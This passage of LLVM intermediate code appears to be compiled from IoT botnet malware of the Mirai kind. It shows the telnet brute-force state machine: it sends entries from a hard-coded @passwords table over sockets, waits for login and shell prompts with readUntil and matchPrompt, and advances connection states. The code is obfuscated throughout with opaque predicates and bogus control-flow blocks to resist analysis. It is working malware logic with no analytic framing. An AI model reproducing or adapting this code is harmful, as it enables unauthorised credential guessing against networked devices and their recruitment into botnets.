; <label>:1730:                                   ; preds = %1715, %originalBBpart2182
  %1731 = load i32, i32* @x.63
  %1732 = load i32, i32* @y.64
  %1733 = sub i32 %1731, 1
  %1734 = mul i32 %1731, %1733
  %1735 = urem i32 %1734, 2
  %1736 = icmp eq i32 %1735, 0
  %1737 = icmp slt i32 %1732, 10
  %1738 = or i1 %1736, %1737
  br i1 %1738, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1730
  %1739 = load i32, i32* @x.63
  %1740 = load i32, i32* @y.64
  %1741 = sub i32 %1739, 1
  %1742 = mul i32 %1739, %1741
  %1743 = urem i32 %1742, 2
  %1744 = icmp eq i32 %1743, 0
  %1745 = icmp slt i32 %1740, 10
  %1746 = or i1 %1744, %1745
  br i1 %1746, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %2958

; <label>:1747:                                   ; preds = %originalBBpart223
  %1748 = load i32, i32* %2, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1749
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1750, i32 0, i32 0
  %1752 = load i32, i32* %1751, align 16
  %1753 = load i32, i32* %2, align 4
  %1754 = sext i32 %1753 to i64
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1754
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1755, i32 0, i32 5
  %1757 = load i8, i8* %1756, align 1
  %1758 = zext i8 %1757 to i64
  %1759 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1758
  %1760 = load i8*, i8** %1759, align 8
  %1761 = load i32, i32* %2, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1763, i32 0, i32 5
  %1765 = load i8, i8* %1764, align 1
  %1766 = zext i8 %1765 to i64
  %1767 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1766
  %1768 = load i8*, i8** %1767, align 8
  %1769 = call i64 @strlen(i8* %1768) #10
  %1770 = call i64 @send(i32 %1752, i8* %1760, i64 %1769, i32 16384)
  %1771 = icmp slt i64 %1770, 0
  br i1 %1771, label %1772, label %1787

; <label>:1772:                                   ; preds = %1747
  %1773 = load i32, i32* %2, align 4
  %1774 = sext i32 %1773 to i64
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 0
  %1777 = load i32, i32* %1776, align 16
  %1778 = call i32 @sclose(i32 %1777)
  %1779 = load i32, i32* %2, align 4
  %1780 = sext i32 %1779 to i64
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1780
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1781, i32 0, i32 2
  store i8 0, i8* %1782, align 8
  %1783 = load i32, i32* %2, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1784
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1785, i32 0, i32 3
  store i8 1, i8* %1786, align 1
  br label %2959

; <label>:1787:                                   ; preds = %1747
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 0
  %1792 = load i32, i32* %1791, align 16
  %1793 = call i64 @send(i32 %1792, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1794 = icmp slt i64 %1793, 0
  br i1 %1794, label %1795, label %1810

; <label>:1795:                                   ; preds = %1787
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 0
  %1800 = load i32, i32* %1799, align 16
  %1801 = call i32 @sclose(i32 %1800)
  %1802 = load i32, i32* %2, align 4
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1803
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1804, i32 0, i32 2
  store i8 0, i8* %1805, align 8
  %1806 = load i32, i32* %2, align 4
  %1807 = sext i32 %1806 to i64
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1807
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1808, i32 0, i32 3
  store i8 1, i8* %1809, align 1
  br label %2959

; <label>:1810:                                   ; preds = %1787
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 2
  store i8 6, i8* %1814, align 8
  br label %2958

; <label>:1815:                                   ; preds = %originalBBpart223
  %1816 = load i32, i32* %2, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1817
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1818, i32 0, i32 6
  %1820 = load i32, i32* %1819, align 4
  %1821 = icmp eq i32 %1820, 0
  br i1 %1821, label %1822, label %1844

; <label>:1822:                                   ; preds = %1815
  %1823 = load i32, i32* @x.63
  %1824 = load i32, i32* @y.64
  %1825 = sub i32 %1823, 1
  %1826 = mul i32 %1823, %1825
  %1827 = urem i32 %1826, 2
  %1828 = icmp eq i32 %1827, 0
  %1829 = icmp slt i32 %1824, 10
  %1830 = or i1 %1828, %1829
  br i1 %1830, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1822
  %1831 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1832 = load i32, i32* %2, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 6
  store i32 %1831, i32* %1835, align 4
  %1836 = load i32, i32* @x.63
  %1837 = load i32, i32* @y.64
  %1838 = sub i32 %1836, 1
  %1839 = mul i32 %1836, %1838
  %1840 = urem i32 %1839, 2
  %1841 = icmp eq i32 %1840, 0
  %1842 = icmp slt i32 %1837, 10
  %1843 = or i1 %1841, %1842
  br i1 %1843, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br label %1844

; <label>:1844:                                   ; preds = %originalBBpart2190, %1815
  %1845 = load i32, i32* %2, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1846
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1847, i32 0, i32 0
  %1849 = load i32, i32* %1848, align 16
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1852, i32 0, i32 8
  %1854 = load i8*, i8** %1853, align 8
  %1855 = load i32, i32* %2, align 4
  %1856 = sext i32 %1855 to i64
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1856
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1857, i32 0, i32 7
  %1859 = load i16, i16* %1858, align 16
  %1860 = zext i16 %1859 to i32
  %1861 = call i32 @readUntil(i32 %1849, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1854, i32 1024, i32 %1860)
  %1862 = icmp ne i32 %1861, 0
  br i1 %1862, label %1863, label %1954

; <label>:1863:                                   ; preds = %1844
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 6
  store i32 0, i32* %1867, align 4
  %1868 = load i32, i32* %2, align 4
  %1869 = sext i32 %1868 to i64
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1869
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1870, i32 0, i32 7
  store i16 0, i16* %1871, align 16
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 8
  %1876 = load i8*, i8** %1875, align 8
  %1877 = call i8* @strstr(i8* %1876, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1878 = icmp ne i8* %1877, null
  br i1 %1878, label %1879, label %1899

; <label>:1879:                                   ; preds = %1863
  %1880 = load i32, i32* %2, align 4
  %1881 = sext i32 %1880 to i64
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1881
  %1883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1882, i32 0, i32 8
  %1884 = load i8*, i8** %1883, align 8
  call void @llvm.memset.p0i8.i64(i8* %1884, i8 0, i64 1024, i32 1, i1 false)
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 0
  %1889 = load i32, i32* %1888, align 16
  %1890 = call i32 @sclose(i32 %1889)
  %1891 = load i32, i32* %2, align 4
  %1892 = sext i32 %1891 to i64
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1892
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1893, i32 0, i32 2
  store i8 0, i8* %1894, align 8
  %1895 = load i32, i32* %2, align 4
  %1896 = sext i32 %1895 to i64
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1896
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1897, i32 0, i32 3
  store i8 0, i8* %1898, align 1
  br label %2959

; <label>:1899:                                   ; preds = %1863
  %1900 = load i32, i32* %2, align 4
  %1901 = sext i32 %1900 to i64
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1901
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1902, i32 0, i32 8
  %1904 = load i8*, i8** %1903, align 8
  %1905 = call i32 @matchPrompt(i8* %1904)
  %1906 = icmp ne i32 %1905, 0
  br i1 %1906, label %1943, label %1907

; <label>:1907:                                   ; preds = %1899
  %1908 = load i32, i32* @x.63
  %1909 = load i32, i32* @y.64
  %1910 = sub i32 %1908, 1
  %1911 = mul i32 %1908, %1910
  %1912 = urem i32 %1911, 2
  %1913 = icmp eq i32 %1912, 0
  %1914 = icmp slt i32 %1909, 10
  %1915 = or i1 %1913, %1914
  br i1 %1915, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %1907
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 8
  %1920 = load i8*, i8** %1919, align 8
  call void @llvm.memset.p0i8.i64(i8* %1920, i8 0, i64 1024, i32 1, i1 false)
  %1921 = load i32, i32* %2, align 4
  %1922 = sext i32 %1921 to i64
  %1923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1922
  %1924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1923, i32 0, i32 0
  %1925 = load i32, i32* %1924, align 16
  %1926 = call i32 @sclose(i32 %1925)
  %1927 = load i32, i32* %2, align 4
  %1928 = sext i32 %1927 to i64
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1928
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1929, i32 0, i32 2
  store i8 0, i8* %1930, align 8
  %1931 = load i32, i32* %2, align 4
  %1932 = sext i32 %1931 to i64
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1932
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1933, i32 0, i32 3
  store i8 1, i8* %1934, align 1
  %1935 = load i32, i32* @x.63
  %1936 = load i32, i32* @y.64
  %1937 = sub i32 %1935, 1
  %1938 = mul i32 %1935, %1937
  %1939 = urem i32 %1938, 2
  %1940 = icmp eq i32 %1939, 0
  %1941 = icmp slt i32 %1936, 10
  %1942 = or i1 %1940, %1941
  br i1 %1942, label %originalBBpart2194, label %originalBB192alteredBB

originalBBpart2194:                               ; preds = %originalBB192
  br label %2959

; <label>:1943:                                   ; preds = %1899
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1946, i32 0, i32 2
  store i8 7, i8* %1947, align 8
  br label %1948

; <label>:1948:                                   ; preds = %1943
  %1949 = load i32, i32* %2, align 4
  %1950 = sext i32 %1949 to i64
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1950
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1951, i32 0, i32 8
  %1953 = load i8*, i8** %1952, align 8
  call void @llvm.memset.p0i8.i64(i8* %1953, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:1954:                                   ; preds = %1844
  %1955 = load i32, i32* %2, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1956
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1957, i32 0, i32 0
  %1959 = load i32, i32* %1958, align 16
  %1960 = load i32, i32* %2, align 4
  %1961 = sext i32 %1960 to i64
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1961
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1962, i32 0, i32 8
  %1964 = load i8*, i8** %1963, align 8
  %1965 = load i32, i32* %2, align 4
  %1966 = sext i32 %1965 to i64
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1966
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1967, i32 0, i32 7
  %1969 = load i16, i16* %1968, align 16
  %1970 = zext i16 %1969 to i32
  %1971 = call i32 @readUntil(i32 %1959, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1964, i32 1024, i32 %1970)
  %1972 = icmp ne i32 %1971, 0
  br i1 %1972, label %1973, label %2112

; <label>:1973:                                   ; preds = %1954
  %1974 = load i32, i32* %2, align 4
  %1975 = sext i32 %1974 to i64
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1975
  %1977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1976, i32 0, i32 6
  store i32 0, i32* %1977, align 4
  %1978 = load i32, i32* %2, align 4
  %1979 = sext i32 %1978 to i64
  %1980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1979
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1980, i32 0, i32 7
  store i16 0, i16* %1981, align 16
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1984, i32 0, i32 8
  %1986 = load i8*, i8** %1985, align 8
  %1987 = call i8* @strstr(i8* %1986, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1988 = icmp ne i8* %1987, null
  br i1 %1988, label %1989, label %2009

; <label>:1989:                                   ; preds = %1973
  %1990 = load i32, i32* %2, align 4
  %1991 = sext i32 %1990 to i64
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1991
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1992, i32 0, i32 8
  %1994 = load i8*, i8** %1993, align 8
  call void @llvm.memset.p0i8.i64(i8* %1994, i8 0, i64 1024, i32 1, i1 false)
  %1995 = load i32, i32* %2, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1996
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1997, i32 0, i32 0
  %1999 = load i32, i32* %1998, align 16
  %2000 = call i32 @sclose(i32 %1999)
  %2001 = load i32, i32* %2, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2002
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2003, i32 0, i32 2
  store i8 0, i8* %2004, align 8
  %2005 = load i32, i32* %2, align 4
  %2006 = sext i32 %2005 to i64
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2006
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2007, i32 0, i32 3
  store i8 0, i8* %2008, align 1
  br label %2959

; <label>:2009:                                   ; preds = %1973
  %2010 = load i32, i32* @x.63
  %2011 = load i32, i32* @y.64
  %2012 = sub i32 %2010, 1
  %2013 = mul i32 %2010, %2012
  %2014 = urem i32 %2013, 2
  %2015 = icmp eq i32 %2014, 0
  %2016 = icmp slt i32 %2011, 10
  %2017 = or i1 %2015, %2016
  br i1 %2017, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %2009
  %2018 = load i32, i32* %2, align 4
  %2019 = sext i32 %2018 to i64
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2019
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2020, i32 0, i32 8
  %2022 = load i8*, i8** %2021, align 8
  %2023 = call i32 @matchPrompt(i8* %2022)
  %2024 = icmp ne i32 %2023, 0
  %2025 = load i32, i32* @x.63
  %2026 = load i32, i32* @y.64
  %2027 = sub i32 %2025, 1
  %2028 = mul i32 %2025, %2027
  %2029 = urem i32 %2028, 2
  %2030 = icmp eq i32 %2029, 0
  %2031 = icmp slt i32 %2026, 10
  %2032 = or i1 %2030, %2031
  br i1 %2032, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br i1 %2024, label %2069, label %2033

; <label>:2033:                                   ; preds = %originalBBpart2198
  %2034 = load i32, i32* @x.63
  %2035 = load i32, i32* @y.64
  %2036 = sub i32 %2034, 1
  %2037 = mul i32 %2034, %2036
  %2038 = urem i32 %2037, 2
  %2039 = icmp eq i32 %2038, 0
  %2040 = icmp slt i32 %2035, 10
  %2041 = or i1 %2039, %2040
  br i1 %2041, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %2033
  %2042 = load i32, i32* %2, align 4
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2043
  %2045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2044, i32 0, i32 8
  %2046 = load i8*, i8** %2045, align 8
  call void @llvm.memset.p0i8.i64(i8* %2046, i8 0, i64 1024, i32 1, i1 false)
  %2047 = load i32, i32* %2, align 4
  %2048 = sext i32 %2047 to i64
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2048
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2049, i32 0, i32 0
  %2051 = load i32, i32* %2050, align 16
  %2052 = call i32 @sclose(i32 %2051)
  %2053 = load i32, i32* %2, align 4
  %2054 = sext i32 %2053 to i64
  %2055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2054
  %2056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2055, i32 0, i32 2
  store i8 0, i8* %2056, align 8
  %2057 = load i32, i32* %2, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2058
  %2060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2059, i32 0, i32 3
  store i8 1, i8* %2060, align 1
  %2061 = load i32, i32* @x.63
  %2062 = load i32, i32* @y.64
  %2063 = sub i32 %2061, 1
  %2064 = mul i32 %2061, %2063
  %2065 = urem i32 %2064, 2
  %2066 = icmp eq i32 %2065, 0
  %2067 = icmp slt i32 %2062, 10
  %2068 = or i1 %2066, %2067
  br i1 %2068, label %originalBBpart2202, label %originalBB200alteredBB

originalBBpart2202:                               ; preds = %originalBB200
  br label %2959

; <label>:2069:                                   ; preds = %originalBBpart2198
  %2070 = load i32, i32* @x.63
  %2071 = load i32, i32* @y.64
  %2072 = sub i32 %2070, 1
  %2073 = mul i32 %2070, %2072
  %2074 = urem i32 %2073, 2
  %2075 = icmp eq i32 %2074, 0
  %2076 = icmp slt i32 %2071, 10
  %2077 = or i1 %2075, %2076
  br i1 %2077, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %2069
  %2078 = load i32, i32* %2, align 4
  %2079 = sext i32 %2078 to i64
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2079
  %2081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2080, i32 0, i32 2
  store i8 7, i8* %2081, align 8
  %2082 = load i32, i32* @x.63
  %2083 = load i32, i32* @y.64
  %2084 = sub i32 %2082, 1
  %2085 = mul i32 %2082, %2084
  %2086 = urem i32 %2085, 2
  %2087 = icmp eq i32 %2086, 0
  %2088 = icmp slt i32 %2083, 10
  %2089 = or i1 %2087, %2088
  br i1 %2089, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br label %2090

; <label>:2090:                                   ; preds = %originalBBpart2206
  %2091 = load i32, i32* @x.63
  %2092 = load i32, i32* @y.64
  %2093 = sub i32 %2091, 1
  %2094 = mul i32 %2091, %2093
  %2095 = urem i32 %2094, 2
  %2096 = icmp eq i32 %2095, 0
  %2097 = icmp slt i32 %2092, 10
  %2098 = or i1 %2096, %2097
  br i1 %2098, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %2090
  %2099 = load i32, i32* %2, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2100
  %2102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2101, i32 0, i32 8
  %2103 = load i8*, i8** %2102, align 8
  call void @llvm.memset.p0i8.i64(i8* %2103, i8 0, i64 1024, i32 1, i1 false)
  %2104 = load i32, i32* @x.63
  %2105 = load i32, i32* @y.64
  %2106 = sub i32 %2104, 1
  %2107 = mul i32 %2104, %2106
  %2108 = urem i32 %2107, 2
  %2109 = icmp eq i32 %2108, 0
  %2110 = icmp slt i32 %2105, 10
  %2111 = or i1 %2109, %2110
  br i1 %2111, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br label %2959

; <label>:2112:                                   ; preds = %1954
  %2113 = load i32, i32* %2, align 4
  %2114 = sext i32 %2113 to i64
  %2115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2114
  %2116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2115, i32 0, i32 0
  %2117 = load i32, i32* %2116, align 16
  %2118 = load i32, i32* %2, align 4
  %2119 = sext i32 %2118 to i64
  %2120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2119
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2120, i32 0, i32 8
  %2122 = load i8*, i8** %2121, align 8
  %2123 = load i32, i32* %2, align 4
  %2124 = sext i32 %2123 to i64
  %2125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2124
  %2126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2125, i32 0, i32 7
  %2127 = load i16, i16* %2126, align 16
  %2128 = zext i16 %2127 to i32
  %2129 = call i32 @readUntil(i32 %2117, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2122, i32 1024, i32 %2128)
  %2130 = icmp ne i32 %2129, 0
  br i1 %2130, label %2131, label %2206

; <label>:2131:                                   ; preds = %2112
  %2132 = load i32, i32* %2, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2133
  %2135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2134, i32 0, i32 6
  store i32 0, i32* %2135, align 4
  %2136 = load i32, i32* %2, align 4
  %2137 = sext i32 %2136 to i64
  %2138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2137
  %2139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2138, i32 0, i32 7
  store i16 0, i16* %2139, align 16
  %2140 = load i32, i32* %2, align 4
  %2141 = sext i32 %2140 to i64
  %2142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2141
  %2143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2142, i32 0, i32 8
  %2144 = load i8*, i8** %2143, align 8
  %2145 = call i8* @strstr(i8* %2144, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %2146 = icmp ne i8* %2145, null
  br i1 %2146, label %2147, label %2167

; <label>:2147:                                   ; preds = %2131
  %2148 = load i32, i32* %2, align 4
  %2149 = sext i32 %2148 to i64
  %2150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2149
  %2151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2150, i32 0, i32 8
  %2152 = load i8*, i8** %2151, align 8
  call void @llvm.memset.p0i8.i64(i8* %2152, i8 0, i64 1024, i32 1, i1 false)
  %2153 = load i32, i32* %2, align 4
  %2154 = sext i32 %2153 to i64
  %2155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2154
  %2156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2155, i32 0, i32 0
  %2157 = load i32, i32* %2156, align 16
  %2158 = call i32 @sclose(i32 %2157)
  %2159 = load i32, i32* %2, align 4
  %2160 = sext i32 %2159 to i64
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2160
  %2162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2161, i32 0, i32 2
  store i8 0, i8* %2162, align 8
  %2163 = load i32, i32* %2, align 4
  %2164 = sext i32 %2163 to i64
  %2165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2164
  %2166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2165, i32 0, i32 3
  store i8 0, i8* %2166, align 1
  br label %2959

; <label>:2167:                                   ; preds = %2131
  %2168 = load i32, i32* %2, align 4
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2169
  %2171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2170, i32 0, i32 8
  %2172 = load i8*, i8** %2171, align 8
  %2173 = call i32 @matchPrompt(i8* %2172)
  %2174 = icmp ne i32 %2173, 0
  br i1 %2174, label %2195, label %2175

; <label>:2175:                                   ; preds = %2167
  %2176 = load i32, i32* %2, align 4
  %2177 = sext i32 %2176 to i64
  %2178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2177
  %2179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2178, i32 0, i32 8
  %2180 = load i8*, i8** %2179, align 8
  call void @llvm.memset.p0i8.i64(i8* %2180, i8 0, i64 1024, i32 1, i1 false)
  %2181 = load i32, i32* %2, align 4
  %2182 = sext i32 %2181 to i64
  %2183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2182
  %2184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2183, i32 0, i32 0
  %2185 = load i32, i32* %2184, align 16
  %2186 = call i32 @sclose(i32 %2185)
  %2187 = load i32, i32* %2, align 4
  %2188 = sext i32 %2187 to i64
  %2189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2188
